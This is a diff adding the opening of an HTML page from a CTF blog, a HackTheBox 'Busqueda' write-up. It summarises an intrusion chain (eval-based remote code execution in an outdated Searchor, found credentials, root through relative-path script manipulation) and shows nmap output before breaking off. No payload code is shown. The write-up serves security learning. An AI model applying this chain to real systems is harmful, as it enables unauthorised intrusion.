@@ -1,0 +1,1338 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Busqueda is an easy difficulty box utilizing an outdated version of the small open-source github project Searchor. By examining the pull request history for this project, we learn of an unsafe eval parameter that can be leveraged to achieve remote code execution. After thorough enumeration, we find credentials and a private hosted gitea server, which eventually allows us to view source code over a script we can run with root authority. The script will run a shell script defined by relative path, meaning we can use file path manipulation to execute our own malicious shell script as root. This leads us to obtaining full root authority.'><title>HackTheBox - Busqueda</title>
+
+<link rel='canonical' href='https://yuwenmichael.netlify.app/post/hackthebox-busqueda/'>
+
+<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - Busqueda'>
+<meta property='og:description' content='Busqueda is an easy difficulty box utilizing an outdated version of the small open-source github project Searchor. By examining the pull request history for this project, we learn of an unsafe eval parameter that can be leveraged to achieve remote code execution. After thorough enumeration, we find credentials and a private hosted gitea server, which eventually allows us to view source code over a script we can run with root authority. The script will run a shell script defined by relative path, meaning we can use file path manipulation to execute our own malicious shell script as root. This leads us to obtaining full root authority.'>
+<meta property='og:url' content='https://yuwenmichael.netlify.app/post/hackthebox-busqueda/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Unsafe eval' /><meta property='article:tag' content='Github' /><meta property='article:tag' content='Gitea' /><meta property='article:tag' content='Docker' /><meta property='article:tag' content='File Path Manipulation' /><meta property='article:published_time' content='2023-08-13T10:17:28-05:00'/><meta property='article:modified_time' content='2023-08-13T10:17:28-05:00'/><meta property='og:image' content='https://yuwenmichael.netlify.app/post/hackthebox-busqueda/Busqueda.png' />
+<meta name="twitter:title" content="HackTheBox - Busqueda">
+<meta name="twitter:description" content="Busqueda is an easy difficulty box utilizing an outdated version of the small open-source github project Searchor. By examining the pull request history for this project, we learn of an unsafe eval parameter that can be leveraged to achieve remote code execution. After thorough enumeration, we find credentials and a private hosted gitea server, which eventually allows us to view source code over a script we can run with root authority. The script will run a shell script defined by relative path, meaning we can use file path manipulation to execute our own malicious shell script as root. This leads us to obtaining full root authority."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://yuwenmichael.netlify.app/post/hackthebox-busqueda/Busqueda.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">CTF Adventures</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="Github"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-busqueda/">
+                <img src="/post/hackthebox-busqueda/Busqueda_hucd7cd900a381e6f396b4d3fd74d99876_352215_800x0_resize_box_3.png"
+                        srcset="/post/hackthebox-busqueda/Busqueda_hucd7cd900a381e6f396b4d3fd74d99876_352215_800x0_resize_box_3.png 800w, /post/hackthebox-busqueda/Busqueda_hucd7cd900a381e6f396b4d3fd74d99876_352215_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Busqueda" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack The Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-busqueda/">HackTheBox - Busqueda</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Busqueda is an easy difficulty box utilizing an outdated version of the small open-source github project Searchor. By examining the pull request history for this project, we learn of an unsafe eval parameter that can be leveraged to achieve remote code execution. After thorough enumeration, we find credentials and a private hosted gitea server, which eventually allows us to view source code over a script we can run with root authority. The script will run a shell script defined by relative path, meaning we can use file path manipulation to execute our own malicious shell script as root. This leads us to obtaining full root authority.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 13, 2023</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration</h2>
+<p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Nmap 7.93 scan initiated Sun Apr  9 07:47:17 2023 as: nmap -sCV -oN nmap_initial.txt 10.129.203.183
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.129.203.183
+</span></span><span class="line"><span class="cl">Host is up (0.023s latency).
+</span></span><span class="line"><span class="cl">Not shown: 998 closed tcp ports (conn-refused)
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.52
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.52 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://searcher.htb/
+</span></span><span class="line"><span class="cl">Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"># Nmap done at Sun Apr  9 07:47:26 2023 -- 1 IP address (1 host up) scanned in 9.27 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The open port 80 suggests an http server that we can visit. However, when we try to visit by ip address we are redirected to <code>http://searcher.htb</code>. We must add this address link to are <code>hosts</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ tail /etc/hosts            
